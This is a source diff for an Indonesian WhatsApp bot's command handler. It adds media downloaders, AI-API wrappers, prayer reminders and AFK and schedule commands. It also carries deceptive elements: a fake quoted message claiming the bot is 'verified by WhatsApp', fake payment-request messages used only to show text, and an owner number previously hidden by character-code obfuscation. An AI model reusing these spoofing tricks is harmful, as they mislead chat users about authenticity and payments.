@@ -9,7 +9,6 @@ const jimp = require('jimp');
 const axios = require('axios');
 const chalk = require('chalk');
 const yts = require('yt-search');
-const ytdl = require('@vreden/youtube_scraper');
 const speed = require('performance-now');
 const moment = require("moment-timezone");
 const nou = require("node-os-utils");
@@ -19,8 +18,6 @@ const os = require('os');
 const googleTTS = require('google-tts-api');
 const { say } = require("cfonts")
 const pino = require('pino');
-const { GoogleGenerativeAI } = require("@google/generative-ai");
-const { Client } = require('ssh2');
 const fetch = require('node-fetch');
 const crypto = require('crypto');
 const { exec, spawn, execSync } = require('child_process');
@@ -46,7 +43,7 @@ const from = m.key.remoteJid
 const botNumber = await xyu.decodeJid(xyu.user.id)
 const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
 const budy = (typeof m.text == 'string' ? m.text : '')
-const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
+const buffer64base = "6283176305101@s.whatsapp.net";
 const prefix = "."
 const isCmd = body.startsWith(prefix) ? true : false
 const args = body.trim().split(/ +/).slice(1)
@@ -65,6 +62,7 @@ const isMedia = /image|video|sticker|audio/.test(mime)
 const groupMetadata = m.isGroup ? await xyu.groupMetadata(from).catch(e => {}) : ''
 const groupName = m.isGroup ? groupMetadata.subject : ''
 const participants = m.isGroup ? await groupMetadata.participants : ''
+const isGroup = m.key.remoteJid.endsWith('@g.us')
 const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
 const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
 const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
@@ -76,7 +74,6 @@ ppuser = 'https://files.catbox.moe/0arg0u.jpg'
 ppnyauser = await getBuffer(ppuser)
 
 //============== [ MESSAGE ] ================================================
-
 if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return
 
 if (isCmd) {
@@ -84,6 +81,7 @@ console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chal
 }
 
 //============= [ FAKEQUOTED ] ===============================================
+const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
 
 const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}
 
@@ -107,10 +105,33 @@ remoteJid: "status@broadcast"
 },
 'message': {
 extendedTextMessage: {
-text: "_𝐓𝐚𝐤𝐚𝐬𝐡𝐢 - 𝐁𝐨𝐭𝐳 Telah Terverifikasi Oleh WhatsApp_"
+text: "_Takashi - Botz Telah Terverifikasi Oleh WhatsApp_"
 }
 }
 };
+
+
+function randomNomor(min, max = null){
+if (max !== null) {
+min = Math.ceil(min);
+max = Math.floor(max);
+return Math.floor(Math.random() * (max - min + 1)) + min;
+} else {
+return Math.floor(Math.random() * min) + 1
+}}
+
+async function edit2 (tex1, tex2) {
+var nln = [
+`${tex1}`,
+`${tex2}`
+]
+let { key } = await xyu.sendMessage(from, {text: 'Loading...'},  { quoted: m })
+let duh = randomNomor(800, 1000)
+for (let i = 0; i < nln.length; i++) {
+await sleep(duh)
+await xyu.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
+}}
+
 
 const reSize = async(buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
@@ -143,7 +164,7 @@ if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreat
 
 if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
 var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
-if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
+if (link.test(m.text) && !isCreator && m.isBotAdmin && !m.fromMe) {
 var gclink = (`https://chat.whatsapp.com/` + await xyu.groupInviteCode(m.chat))
 var isLinkThisGc = new RegExp(gclink, 'i')
 var isgclink = isLinkThisGc.test(m.text)
@@ -161,7 +182,7 @@ await xyu.groupParticipantsUpdate(m.chat, [m.sender], "remove")
 
 if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
 var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
-if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
+if (link.test(m.text) && !isCreator && m.isBotAdmin && !m.fromMe) {
 var gclink = (`https://chat.whatsapp.com/` + await xyu.groupInviteCode(m.chat))
 var isLinkThisGc = new RegExp(gclink, 'i')
 var isgclink = isLinkThisGc.test(m.text)
@@ -184,6 +205,164 @@ await m.reply(check.respon)
 }
 
 //============= [ FUNCTION ] ======================================================
+
+async function sendButton(jid, teks1) {
+let msg = generateWAMessageFromContent(jid, {
+viewOnceMessage: {
+message: {
+"messageContextInfo": {
+"deviceListMetadata": {},
+"deviceListMetadataVersion": 2
+},
+interactiveMessage: proto.Message.InteractiveMessage.create({
+body: proto.Message.InteractiveMessage.Body.create({
+text: teks1
+}),
+footer: proto.Message.InteractiveMessage.Footer.create({
+text: `By Xyuraa`
+}),
+header: proto.Message.InteractiveMessage.Header.create({
+title: '',
+gifPlayback: true,
+subtitle: '',
+hasMediaAttachment: false  
+}),
+nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+buttons: [
+									{
+										"name": "cta_reminder",
+										"buttonParamsJson": `{\"display_text\":\"Pengingat Hari Kiamat\",\"id\":\"message\"}`
+									},
+																		{
+										"name": "cta_url",
+										"buttonParamsJson": `{\"display_text\":\"Group!!\",\"url\":\"https://chat.whatsapp.com/EUvs6YzVtm19NUUpiDCoxD",\"merchant_url\":\"https://www.google.com\"}`
+									},
+																		{
+										"name": "cta_url",
+										"buttonParamsJson": `{\"display_text\":\"Saluran!!\",\"url\":\"https://whatsapp.com/channel/0029VaqBRU9ATRSkHSEfND1w\",\"merchant_url\":\"https://www.google.com\"}`
+									}
+],
+}),
+contextInfo: {
+externalAdReply: {
+                    showAdAttribution: true,
+                    mediaType: 2,
+                    mediaUrl: `http://wa.me/6283176305101/${Math.floor(Math.random() * 100000000000000000)}`,
+                    title: `Hai ${pushname}`,
+                    body: `Created by ${ownername}`,
+                    sourceUrl: "",
+                    thumbnail: fkethmb
+}
+}})}}
+}, {quoted: m})
+await xyu.relayMessage(m.chat, msg.message, {
+messageId: msg.key.id
+})
+}
+
+async function tiktokDl(url) {
+	return new Promise(async (resolve, reject) => {
+		try {
+			let data = []
+			function formatNumber(integer) {
+				let numb = parseInt(integer)
+				return Number(numb).toLocaleString().replace(/,/g, '.')
+			}
+			
+			function formatDate(n, locale = 'en') {
+				let d = new Date(n)
+				return d.toLocaleDateString(locale, {
+					weekday: 'long',
+					day: 'numeric',
+					month: 'long',
+					year: 'numeric',
+					hour: 'numeric',
+					minute: 'numeric',
+					second: 'numeric'
+				})
+			}
+			
+			let domain = 'https://www.tikwm.com/api/';
+			let res = await (await axios.post(domain, {}, {
+				headers: {
+					'Accept': 'application/json, text/javascript, */*; q=0.01',
+					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+					'Origin': 'https://www.tikwm.com',
+					'Referer': 'https://www.tikwm.com/',
+					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
+					'Sec-Ch-Ua-Mobile': '?1',
+					'Sec-Ch-Ua-Platform': 'Android',
+					'Sec-Fetch-Dest': 'empty',
+					'Sec-Fetch-Mode': 'cors',
+					'Sec-Fetch-Site': 'same-origin',
+					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+					'X-Requested-With': 'XMLHttpRequest'
+				},
+				params: {
+					url: url,
+					count: 12,
+					cursor: 0,
+					web: 1,
+					hd: 1
+				}
+			})).data.data
+			if (res && !res.size && !res.wm_size && !res.hd_size) {
+				res.images.map(v => {
+					data.push({ type: 'photo', url: v })
+				})
+			} else {
+				if (res && res.wmplay) {
+					data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay })
+				}
+				if (res && res.play) {
+					data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play })
+				}
+				if (res && res.hdplay) {
+					data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay })
+				}
+			}
+			let json = {
+				status: true,
+				title: res.title,
+				taken_at: formatDate(res.create_time).replace('1970', ''),
+				region: res.region,
+				id: res.id,
+				durations: res.duration,
+				duration: res.duration + ' Seconds',
+				cover: 'https://www.tikwm.com' + res.cover,
+				size_wm: res.wm_size,
+				size_nowm: res.size,
+				size_nowm_hd: res.hd_size,
+				data: data,
+				music_info: {
+					id: res.music_info.id,
+					title: res.music_info.title,
+					author: res.music_info.author,
+					album: res.music_info.album ? res.music_info.album : null,
+					url: 'https://www.tikwm.com' + res.music || res.music_info.play
+				},
+				stats: {
+					views: formatNumber(res.play_count),
+					likes: formatNumber(res.digg_count),
+					comment: formatNumber(res.comment_count),
+					share: formatNumber(res.share_count),
+					download: formatNumber(res.download_count)
+				},
+				author: {
+					id: res.author.id,
+					fullname: res.author.unique_id,
+					nickname: res.author.nickname,
+					avatar: 'https://www.tikwm.com' + res.author.avatar
+				}
+			}
+			resolve(json)
+		} catch (e) {
+			reject(e)
+		}
+	});
+}
+
 
 async function uploadToCatbox(filePath) {
             const form = new FormData();
@@ -231,6 +410,57 @@ async function dellCase(filePath, caseNameToRemove) {
 
 const example = (teks) => {
 return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
+}
+
+xyu.autoshalat = xyu.autoshalat ? xyu.autoshalat : {}
+let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? xyu.user.id : m.sender
+let id = m.chat 
+if (id in xyu.autoshalat) {
+    return false
+}
+let jadwalSholat = {
+    shubuh: '04:39',
+    terbit: '05:44',
+    dhuha: '06:02',
+    dzuhur: '12:02',
+    ashar: '15:15',
+    magrib: '17:52',
+    isya: '19:01',
+}
+const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }))
+const hours = datek.getHours()
+const minutes = datek.getMinutes()
+const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
+for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
+if (timeNow === waktu) {
+xyu.autoshalat[id] = [
+xyu.sendMessage(m.chat, {
+audio: {
+url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
+},
+mimetype: 'audio/mp4',
+ptt: true,
+contextInfo: {
+externalAdReply: {
+showAdAttribution: true,
+mediaType: 1,
+mediaUrl: '',
+title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
+body: `🕑 ${waktu}`,
+sourceUrl: '',
+thumbnail: await fs.readFileSync('./src/media/thumb.jpg'),
+renderLargerThumbnail: true
+}
+}
+}, {
+quoted: m,
+mentions: participants.map(a => a.id)
+}),
+setTimeout(async () => {
+delete xyu.autoshalat[m.chat]
+}, 57000)
+]
+}
 }
 
 function generateRandomPassword() {
@@ -293,6 +523,12 @@ async function replymenu(wow) {
     }, { quoted: verif });
 }
 
+const totalFitur = () =>{
+var mytext = fs.readFileSync("case.js").toString()
+var numUpper = (mytext.match(/case '/g) || []).length;
+return numUpper
+}
+
 const reply = (teks) => {
             xyu.sendMessage(m.chat,
 {
@@ -340,7 +576,7 @@ return plugins
 //========= [ COMMANDS PLUGINS ] =================================================
 let pluginsDisable = true;
 const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"));
-const xyuradev = { xyu, toIDR, Func, isCreator, reply, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, args, sleep, botNumber };
+const xyuradev = { xyu, toIDR, Func, sendButton, isCreator, reply, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, args, sleep, botNumber };
 
 for (let plugin of plugins) {
   // don delete may we em 😂
@@ -373,12 +609,201 @@ await xyu.sendMessage(m.chat, {text: aurelmaxyu[i], edit: key });//PESAN LEPAS
 }
 }
 
+if (command && !isGroup && !isCreator && !isPremium) {
+    return reply("Bot hanya dapat digunakan di grup. Silakan bergabung ke grup ini: https://chat.whatsapp.com/KVbM5D5cTMt0jcXNnUqflR");
+}
+if (!xyu.public) {
+if (!isOwner && !m.key.fromMe) return
+        }
+
+if (global.autodonlod && !m.key.fromMe)
+if (budy.match(`tiktok.com`)){
+reply('memuat..')
+await tiktokDl(budy).then(async resi => {
+let taev = `Title : ${resi.title}
+Author : ${resi.author}`
+await xyu.sendMessage(from, {audio: {url: resi.audio}, mimetype: 'audio/mpeg', ptt: false})
+await xyu.sendMessage(from, {video: {url: resi.nowm}, caption: taev})
+}).catch((err) => reply('Maaf erjadi Kesalahan!')) // pengalih isu
+}
+//============= [ GAME ] ====================================================
+	    
+
+let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
+		for (let jid of mentionUser) {
+			let user = db.users[jid]
+			if (!user) continue
+			let afkTime = user.afkTime
+			if (!afkTime || afkTime < 0) continue
+			let reason = user.afkReason || ''
+			m.reply(`Jangan tag dia!\nDia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\nSelama ${clockString(new Date - afkTime)}`.trim())
+		}
+		if (db.users[m.sender].afkTime > -1) {
+			let user = db.users[m.sender]
+			m.reply(`@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}\nSelama ${clockString(new Date - user.afkTime)}`)
+			user.afkTime = -1
+			user.afkReason = ''
+		}
+	
+        
+        //game
 
 //===============================================================================
 
 
 switch (command) {
+case 'ttimg':
+case 'ttslide':
+case 'tiktokslide': {
+    if (!text) return xyu.sendMessage(m.chat, { text: 'Mana Kak Linknya?' });
+    const urol = `https://dlpanda.com/id?url=${text}&token=G7eRpMaa`;
+    const response = await axios.get(urol);
+    const html = response.data;
+    const $ = cheerio.load(html);
+    const imgSrc = [];
+    const creator = 'Ido404';
+
+    $('div.col-md-12 > img').each((index, element) => {
+        imgSrc.push($(element).attr('src'));
+    });
+
+    if (imgSrc.length === 0) return xyu.sendMessage(m.chat, { text: 'Tidak ada gambar ditemukan.' });
+    await xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
+
+    for (let img of imgSrc) {
+        await xyu.sendMessage(m.chat, { image: { url: img } });
+    }
+    await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+}
+break
+
+case 'takashi': {
+if (!isPremium) return reply(mess.prem)
+    if (!q) return m.reply(`*Nanya Apa?*`);
+
+    if (/image|gambar/.test(mime)) {
+        const media = await xyu.downloadAndSaveMediaMessage(quoted);
+        let anuu = await uploadToCatbox(media); // Sesuaikan Dengan Uploader Kalian.
+        const data = await fetchJson(`https://btch.us.kg/bardimg?url=${anuu.result.url}&text=${encodeURIComponent(q)}`);
+        const aimsg = data.result;
+        return await m.reply(aimsg);
+    }    
+    else if (/video|tiktok/.test(q)) {
+        const wann = await (await fetch('https://api.siputzx.my.id/api/s/tiktok?query=' + q)).json();
+        if (wann.data && wann.data.length > 0) {
+            let videoUrl = wann.data[0].play;
+            let title = wann.data[0].title;
+            await xyu.sendMessage(m.chat, { video: { url: videoUrl }, caption: title }, { quoted: m });
+        }
+    }
+    else if (/carikan|cari|buatkan|img/.test(q)) {
+        const anu = await (await fetch('https://btch.us.kg/bingimg?text=' + encodeURIComponent(q))).json();
+        if (anu.status && anu.result && anu.result.length > 0) {
+            for (let i = 0; i < anu.result.length; i++) {
+                await xyu.sendMessage(m.chat, {
+                    image: { url: anu.result[i] },
+                    caption: `🔮 *Hasil Image ke-${i + 1}*`
+                }, { quoted: m });
+            }
+        }
+    }
+    else if (/brat/.test(q)) { // Integrasi dari 'brat2'
+        if (!isPremium) return reply(mess.prem);
+        const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
+        if (!quo) return m.reply("Masukan teksnya woii");
+
+        async function brat(text) {
+            try {
+                return await new Promise((resolve, reject) => {
+                    if (!text) return reject("missing text input");
+                    axios.get("https://brat.caliphdev.com/api/brat", {
+                        params: { text },
+                        responseType: "arraybuffer"
+                    }).then(res => {
+                        const image = Buffer.from(res.data);
+                        if (image.length <= 10240) return reject("failed generate brat");
+                        return resolve({ success: true, image });
+                    });
+                });
+            } catch (e) {
+                return { success: false, errors: e };
+            }
+        }
+
+        const buf = await brat(quo);
+        await xyu.imgToSticker(m.chat, buf.image, m, { packname: "Xyuraa", author: "Takashi - Botz" });
+    }
+    else if (/music|musik|play|putarkan/.test(q)) {
+        let search = await yts(q);
+        let firstVideo = search.all[0];
+        let wann = await fetchJson(`https://api.vreden.my.id/api/ytmp3?url=${firstVideo.url}`);
+        let data = wann.result;
+
+        if (data.status) {
+            let audioUrl = data.download.url;
+            let audioTitle = data.metadata.title;
+            let audioThumbnail = data.metadata.thumbnail || "https://files.catbox.moe/h18n1s.jpg";
+
+            await xyu.sendMessage(m.chat, {
+                audio: { url: audioUrl },
+                mimetype: 'audio/mpeg',
+                ptt: true,
+                contextInfo: {
+                    externalAdReply: {
+                        showAdAttribution: true,
+                        title: audioTitle || "Untitled",
+                        body: `${botname}`,
+                        sourceUrl: data.metadata.url,
+                        thumbnailUrl: audioThumbnail,
+                        mediaType: 1,
+                        renderLargerThumbnail: true
+                    }
+                }
+            }, { quoted: m });
+        }
+    }
+    else {
+        var wanz = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(q)}`);
+        var wan = wanz.result;
+        await m.reply(wan);
+    }
+}
+break;
+case 'texttospech': case 'tts': case 'tospech': {
+				if (!text) return m.reply('Mana text yg mau diubah menjadi audio?')
+				let { tts } = require('./lib/tts')
+				let anu = await tts(text)
+				xyu.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
+			}
+			break
+
+case 'ytmp3': {
+  const url = args[0];
+  if (!url) return reply("Masukkan URL untuk mengunduh audio!");
+  try {
+    // Panggil API untuk mengunduh audio
+    const response = await axios.get(`https://axeel.my.id/api/download/audio`, {
+      params: { url },
+      responseType: 'arraybuffer', // Karena API mengembalikan data audio
+    });
+
+    // Konversi respons menjadi buffer
+    const audioBuffer = Buffer.from(response.data);
+
+    // Kirim audio ke pengguna
+    await xyu.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
+  } catch (error) {
+    console.error("Kesalahan API:", error.response ? error.response.data : error.message);
+    reply("Terjadi kesalahan saat memproses permintaan. Pastikan URL valid atau coba lagi nanti.");
+  }
+}
+break;
+
+
+
 case 'play': {
+if (!text) return reply("masukan query")
+await xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
   const axios = require('axios');
   const yts = require('yt-search');
   const SaveTube = {
@@ -447,10 +872,120 @@ case 'play': {
     console.error(error);
     reply('❌ Terjadi kesalahan saat memproses permintaan Anda: ' + error.message);
   }
+  await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 }
 break;
 
+case 'liston': {
+if (!m.isGroup) return reply(mess.group);
+if (!isCreator) return reply(mess.owner)
+let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
+let online = [...Object.keys(store.presences[id]), botNumber]
+await xyu.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `> @` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: verif }).catch((e) => reply('Fail'))
+			}
+			break
 
+//================================================================================
+case 'totalfitur':
+ xyu.relayMessage(m.chat, {
+ "requestPaymentMessage": {
+ amount: { 
+ value: 2022000,
+ offset: 0,
+ currencyCode: 'IDR'
+ },
+ amount1000: 55000000,
+ background: null,
+ currencyCodeIso4217: 'USD',
+ expiryTimestamp: 0,
+ noteMessage: {
+ extendedTextMessage: {
+ text: 
+`*TOTAL FEATURE*
+
+• BerJumlah ${totalFitur()} Fitur\n*Tipe :* Case
+
+Silahkan ketik *.menu* untuk
+Menampilkan menu utama`
+ }
+ },
+ requestFrom: m.sender
+ }
+ }, {})
+break
+//===============================================================================
+case 'hitungmundur': {
+    const today = new Date(); // Tanggal hari ini
+    
+    // Tanggal-tanggal penting
+    const ramadhan = new Date('2025-03-10'); // Ganti sesuai perkiraan awal Ramadhan
+    const idulFitri = new Date('2025-04-10'); // Ganti sesuai tanggal Idul Fitri
+
+    // Fungsi menghitung selisih hari
+    const calculateDays = (date) => Math.ceil((date - today) / (1000 * 60 * 60 * 24));
+    
+    // Selisih hari
+    const daysToRamadhan = calculateDays(ramadhan);
+    const daysToIdulFitri = calculateDays(idulFitri);
+
+    // Pesan hasil
+    let message = `🌙 *Hitung Mundur*:\n\n`;
+    message += `- Ramadhan: ${daysToRamadhan > 0 ? `${daysToRamadhan} hari lagi` : 'Sedang berlangsung atau sudah berlalu'}\n`;
+    message += `- Idul Fitri: ${daysToIdulFitri > 0 ? `${daysToIdulFitri} hari lagi` : 'Sedang berlangsung atau sudah berlalu'}\n`;
+
+    // Kirim pesan ke pengguna
+    await xyu.sendMessage(m.chat, { text: message }, { quoted: m });
+}
+break;
+//================================================================================
+case "jadwal": case "mapel":
+const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
+const today = new Date();
+const currentDay = days[today.getDay()];
+
+let schedule;
+
+switch (currentDay) {
+    case "Senin":
+        schedule = `*>SENIN*\n• B. Inggris\n• IPAS\n• IPAS\n• Pendais\n• Pendais\n• Informatika`;
+        break;
+    case "Selasa":
+        schedule = `*>SELASA*\n• Dasar Kejuruan\n• B. Indonesia\n• Dasar Kejuruan\n• Matematika`;
+        break;
+    case "Rabu":
+        schedule = `*>RABU*\n• Penjas\n• Dasar Kejuruan\n• B. Inggris\n• Informatika`;
+        break;
+    case "Kamis":
+        schedule = `*>KAMIS*\n• Sejarah\n• PPKn\n• B. Indonesia\n• Seni Budaya\n• Matematika`;
+        break;
+    case "Jumat":
+        schedule = `*>JUMAT*\n• B. Jawa\n• Dasar Kejuruan\n• IPAS`;
+        break;
+    default:
+        schedule = `Tidak ada jadwal untuk hari ini.`;
+        break;
+}
+
+const message = `*JADWAL PELAJARAN ‼️*\n\nHari: ${currentDay}\n\n${schedule}`;
+
+await xyu.relayMessage(m.chat, {
+    requestPaymentMessage: {
+        currencyCodeIso4217: 'IDR',
+        amount1000: 1000000000,
+        requestFrom: m.sender,
+        noteMessage: {
+            extendedTextMessage: {
+                text: message,
+                contextInfo: {
+                    externalAdReply: {
+                        showAdAttribution: true,
+                    }
+                }
+            }
+        }
+    }
+}, {})
+break;
 //===============================================================================
 
 case 'qc': {
@@ -617,10 +1152,107 @@ case 'ig': case 'instagram': {
 break
 
 //================================================================================
+case 'bard': {
+  if (!text) {
+    return reply('Masukkan teks, contoh: .bard Jelaskan topik ini.');
+  }
+  try {
+    const yudd = await fetchJson(`https://api.tioo.eu.org/bard?text=${encodeURIComponent(text)}`);
+    if (yudd && yudd.result) {
+      await reply(yudd.result);
+    } else {
+      await reply('Tidak ada hasil dari API.');
+    }
+  } catch (e) {
+    console.error(e);
+    return reply('Terjadi kesalahan, coba lagi nanti.');
+  }
+}
+break;
 
+
+case 'jkt48info': {
+  const axios = require('axios');
+  const cheerio = require('cheerio');
+
+  function shuffle(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [array[i], array[j]] = [array[j], array[i]];
+    }
+    return array;
+  }
+
+  async function scrapeJkt48(query) {
+    try {
+      if (query === 'berita') {
+        const newsResponse = await axios.get('https://jkt48.com/news/list?lang=id');
+        const $ = cheerio.load(newsResponse.data);
+        const newsList = [];
+        $('.entry-news__list').each((_, element) => {
+          const title = $(element).find('.entry-news__list--item h3 a').text().trim();
+          const link = $(element).find('.entry-news__list--item h3 a').attr('href');
+          const date = $(element).find('.entry-news__list--item time').text().trim();
+          newsList.push({ title, link: `https://jkt48.com${link}`, date });
+        });
+        const randomNews = shuffle(newsList).slice(0, Math.max(10, newsList.length));
+        return `*📢 Berita JKT48 :*\n\n${randomNews.map((item, idx) => `${idx + 1}. ${item.title}\n   Link: ${item.link}\n   Tanggal: ${item.date}`).join('\n\n')}`;
+      } else if (query === 'jadwal') {
+        const eventResponse = await axios.get('https://jkt48.com');
+        const $ = cheerio.load(eventResponse.data);
+        const schedule = [];
+        $('.entry-schedule__calendar .table tbody tr').each((_, element) => {
+          const dateText = $(element).find('td h3').html().trim();
+          const date = dateText.split('<br>')[0].trim();
+          const day = dateText.split('<br>')[1].replace(/[()]/g, '').trim();
+          const events = [];
+          $(element).find('.contents p a').each((_, eventElement) => {
+            const event = $(eventElement).text().trim();
+            const link = $(eventElement).attr('href');
+            events.push({ event, link: `https://jkt48.com${link}` });
+          });
+          schedule.push({ date, day, events });
+        });
+        const randomSchedule = shuffle(schedule).slice(0, Math.max(10, schedule.length));
+        return `*📅 Jadwal JKT48 :*\n\n${randomSchedule.map((item, idx) => `${idx + 1}. ${item.date} (${item.day})\n   Acara: ${item.events.map(e => e.event).join(', ')}`).join('\n\n')}`;
+      } else if (query === 'member') {
+        const memberResponse = await axios.get('https://jkt48.com/member/list?lang=id');
+        const $ = cheerio.load(memberResponse.data);
+        const members = [];
+        $('div.col-4.col-lg-2').each((_, element) => {
+          const name = $(element).find('.entry-member__name a').html().replace(/<br\s*\/?>/g, ' ').trim();
+          const profileLink = $(element).find('.entry-member a').attr('href');
+          const imageSrc = $(element).find('.entry-member img').attr('src');
+          members.push({
+            name,
+            profileLink: profileLink ? `https://jkt48.com${profileLink}` : null,
+            imageSrc: imageSrc ? `https://jkt48.com${imageSrc}` : null,
+          });
+        });
+        const randomMembers = shuffle(members).slice(0, Math.max(10, members.length));
+        return `*Member JKT48 :*\n\n${randomMembers.map((member, idx) => `${idx + 1}. ${member.name}\n   Profil: ${member.profileLink}`).join('\n\n')}`;
+      } else {
+        return `❌ Query tidak dikenal. Gunakan salah satu dari: *berita*, *jadwal*, *member*\n\ncontoh : ${prefix + command } berita`;
+      }
+    } catch (err) {
+      return `Terjadi kesalahan: ${err.message}`;
+    }
+  }
+
+  const query = args[0]?.toLowerCase();
+  scrapeJkt48(query).then(response => {
+    xyu.sendMessage(from, { text: response }, { quoted: m });
+  }).catch(err => {
+    xyu.sendMessage(from, { text: `Error: ${err.message}` }, { quoted: m });
+  });
+
+  break;
+}
+
+//===============================================================================
 case 'tiktok':
 case 'tt': {
-if (!m.quoted && !text) return reply('reply')
+if (!m.quoted && !text) return reply('mana link tiktoknya?')
     if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
     const api = require('btch-downloader')
     if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
@@ -1233,6 +1865,28 @@ const buf = await brat(quo);
 await xyu.imgToSticker(m.chat, buf.image, m, { packname: "Xyuraa", author: "Takashi - Botz" })
 }
 break
+//===============================================================================
+
+case 'brat': {
+  const inputText = args.length > 0 
+    ? args.join(" ") 
+    : m.quoted?.text || null;
+
+  if (!inputText) return reply("Masukkan teks!!");
+  try {
+    const response = await axios.get(`https://fgsi-brat.hf.space/?text=${encodeURIComponent(inputText)}`, {
+      responseType: 'arraybuffer', 
+    });
+    const imageBuffer = Buffer.from(response.data);
+    await xyu.imgToSticker(m.chat, imageBuffer, m, {
+      packname: "Created by Takashi - botz"
+    });
+  } catch (error) {
+    console.error("Kesalahan API:", error.response ? error.response.data : error.message);
+    reply("Terjadi kesalahan saat memproses permintaan. Coba lagi nanti.");
+  }
+}
+break;
 
 //================================================================================
 
@@ -1303,7 +1957,15 @@ var data = await screenshotV2(text)
 await xyu.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
 }
 break
+//===============================================================================
 
+case 'afk': {
+				let user = db.users[m.sender]
+				user.afkTime = + new Date
+				user.afkReason = text
+				m.reply(`@${m.sender.split('@')[0]} Telah Afk${text ? ': ' + text : ''}`)
+			}
+			break
 //================================================================================
 
 case 'delcase': {
@@ -1316,7 +1978,7 @@ reply('*Dellcase Successfully*')
 break
 
 //================================================================================
-/*
+
 case 'delsesi':
 case 'clear':
 case 'ds':
@@ -1331,13 +1993,13 @@ let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
 item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
 )
 console.log(filteredArray.length);
-let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
+/*let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
 if (filteredArray.length == 0) return reply(teks)
 filteredArray.map(function(e, i) {
 teks += (i + 1) + `. ${e}\n`
 })
 reply(teks)
-await sleep(2000)
+await sleep(2000)*/
  reply("Menghapus file sampah...")
 await filteredArray.forEach(function(file) {
 fs.unlinkSync(`./session/${file}`)
